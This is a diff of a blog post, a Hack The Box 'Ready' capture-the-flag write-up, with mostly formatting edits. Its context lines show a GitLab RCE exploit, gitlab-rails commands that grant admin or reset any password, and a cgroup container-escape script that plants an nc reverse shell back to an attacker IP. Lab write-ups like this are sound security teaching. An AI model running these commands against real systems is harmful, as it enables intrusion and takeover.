@@ -19,8 +19,9 @@ Hello guys!
 
 This week's machine will be **Ready**, another median-rated machine from [Hack The Box](https://www.hackthebox.eu), created by [bertolis](https://app.hackthebox.eu/users/27897).
 
-\:information\_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they're retired.
-\[info]
+<Alert kind="info" title="Info">
+  Write-ups for Hack The Box machines are posted as soon as they're retired.
+</Alert>
 
 ![HTB Ready](https://i.imgur.com/QV6d376.png)
 
@@ -39,14 +40,14 @@ Host is up (0.078s latency).
 Not shown: 998 closed ports
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
 |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
 |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
 5080/tcp open  http    nginx
 | http-robots.txt: 53 disallowed entries (15 shown)
-| / /autocomplete/users /search /api /admin /profile 
-| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
+| / /autocomplete/users /search /api /admin /profile
+| /dashboard /projects/new /groups/new /groups/*/edit /users /help
 |_/s/ /snippets/new /snippets/*/edit
 | http-title: Sign in \xC2\xB7 GitLab
 |_Requested resource was http://10.10.10.220:5080/users/sign_in
@@ -84,7 +85,7 @@ Shellcodes: No Results
 Using the last result (49334.py), noticed that it didn't allowed us to set the service port, which required some edit, as well as an issue in the payload generation, where was necessary to update the parameter `local_port` to `local_port = args.P`.
 
 ```bash
-$ python3 49334.py -h                                                                
+$ python3 49334.py -h
 usage: 49334.py [-h] -u U -p P -g G -l L -P P
 
 GitLab 11.4.7 RCE
@@ -106,12 +107,12 @@ After these changes, obtained a reverse shell as user **git** in the directory `
 
 After initial shell, started enumeration using `linenum.sh`, where the following details called attention:
 
-* App execution inside a docker container, being necessary to escape to the host later.
-* There's a local user `dude` (id=1000), where the user flag `user.txt` resides in his home directory.
-* Obtained the GitLab Server credentials dump, where the user `root` is the only one with privileges, which has the password hash below:
+- App execution inside a docker container, being necessary to escape to the host later.
+- There's a local user `dude` (id=1000), where the user flag `user.txt` resides in his home directory.
+- Obtained the GitLab Server credentials dump, where the user `root` is the only one with privileges, which has the password hash below:
 
-| username | e-mail                                         | admin | hash                                                         |
-| -------- | ---------------------------------------------- | ----- | ------------------------------------------------------------ |
+| username | e-mail              | admin | hash                                                         |
+| -------- | ------------------- | ----- | ------------------------------------------------------------ |
 | root     | `admin@example.com` | true  | $2a$10$zzun9kmrHMdwsJZKTmwn9OZddFjwrhbaXx3b2eb9l2g.1LrjZo0V2 |
 
 Based on the information above, first thing tried was to check the required privileges to read `user.txt`, where we identified that `git` user had access, so we've collected it.
@@ -136,8 +137,8 @@ Next step would be obtaining the root credential to read the `root.txt` flag. As
 
 During the enumeration, the information was also shared along with the credential dump:
 
-> If you have enough privileges, you can make an account under your control administrator by running: gitlab-rails runner 'user = User.find\_by(email: "`youruser@example.com`"); user.admin = TRUE; user.save!'
-> Alternatively, you could change the password of any user by running: gitlab-rails runner 'user = User.find\_by(email: "`admin@example.com`"); user.password = "pass\_peass\_pass"; user.password\_confirmation = "pass\_peass\_pass"; user.save!'
+> If you have enough privileges, you can make an account under your control administrator by running: gitlab-rails runner 'user = User.find_by(email: "`youruser@example.com`"); user.admin = TRUE; user.save!'
+> Alternatively, you could change the password of any user by running: gitlab-rails runner 'user = User.find_by(email: "`admin@example.com`"); user.password = "pass_peass_pass"; user.password_confirmation = "pass_peass_pass"; user.save!'
 
 Based on that, proceeded with the root account password reset as recommended, but no private repository or additional information was found, that could help us succeed on obtaining root's credentials.
 
@@ -178,15 +179,15 @@ Following the step-by-step described on it, created a listener in 4443 TCP in at
 ```bash
 # In the container
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
- 
+
 echo 1 > /tmp/cgrp/x/notify_on_release
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
- 
+
 echo '#!/bin/sh' > /cmd
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f" >> /cmd
 chmod a+x /cmd
- 
+
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
